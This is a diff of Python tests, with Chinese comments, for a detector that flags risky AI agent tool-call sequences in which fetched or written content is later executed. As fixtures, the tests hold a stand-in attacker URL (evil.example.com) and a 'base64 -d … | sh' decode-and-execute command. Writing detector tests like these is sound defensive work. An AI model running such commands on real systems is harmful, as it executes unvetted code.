@@ -183,17 +183,42 @@ def test_tool_return_inlined_into_exec_is_critical() -> None:
     assert f.evidence["pattern"] == "tool_return->execute"
 
 
-def test_whole_command_is_fetched_script_is_critical() -> None:
-    """命令首 token 即抓取内容(整条命令就是 fetch 来的脚本)→ 仍 critical(执行位=程序本身)。"""
-    payload = "node /opt/custom/orchestrate.js --force-redeploy-all-prod-nodes"
+def test_lookup_program_path_then_execute_not_critical() -> None:
+    """复审 #93 硬负例:registry.lookup 返回已部署程序路径 → 执行该路径(企业「查工具路径再
+    执行」模式)。命令不危险、无落盘步 → 不得判 critical(旧 branch ③ startswith 会误判,已移除)。"""
+    prog = "/opt/gov/bin/monthly-statistics-exporter"
     findings = _analyze_ctx(
-        _intent("http.request", url="http://evil.example.com/s"),
-        _intent("shell.exec", command=payload),
-        tool_returns=[payload],
+        _intent("registry.lookup", name="statistics-exporter"),
+        _intent("shell.exec", command=f"{prog} --month 2026-06 --out /tmp/report.csv"),
+        tool_returns=[prog],
+    )
+    assert findings == []
+
+
+def test_config_get_command_then_execute_not_critical() -> None:
+    """config.get 返回命令字符串 → 直接执行(不危险、无落盘)→ 不判 critical(同上,移除 branch ③)。"""
+    cmd = "java -jar /opt/svc/report-builder.jar --profile prod --region east"
+    findings = _analyze_ctx(
+        _intent("config.get", key="jobs.report.command"),
+        _intent("shell.exec", command=cmd),
+        tool_returns=[cmd],
+    )
+    assert findings == []
+
+
+def test_code_run_script_key_dangerous_upgrades_critical() -> None:
+    """复审 #93 次要:危险载荷放 script 键(code.run(script="…|sh"))也须被看到并升 critical。
+    旧 argrisk.command_dangerous 只读 command/cmd → 封顶 0.7;改 _exec_is_dangerous 后升 0.9。"""
+    findings = _analyze_ctx(
+        _intent("file.write", path="/tmp/run.sh", content="ZWNobyBoaQ=="),
+        _intent("code.run", script="base64 -d /tmp/run.sh | sh"),
     )
     assert len(findings) == 1
-    assert findings[0].evidence["severity"] == "critical"
-    assert findings[0].evidence["pattern"] == "tool_return->execute"
+    f = findings[0]
+    assert f.score == 0.9
+    assert f.evidence["severity"] == "critical"
+    assert f.evidence["pattern"] == "write->execute"
+    assert f.evidence["dangerous_command"] is True
 
 
 def test_tool_return_long_path_as_data_flag_not_inline_exec() -> None:
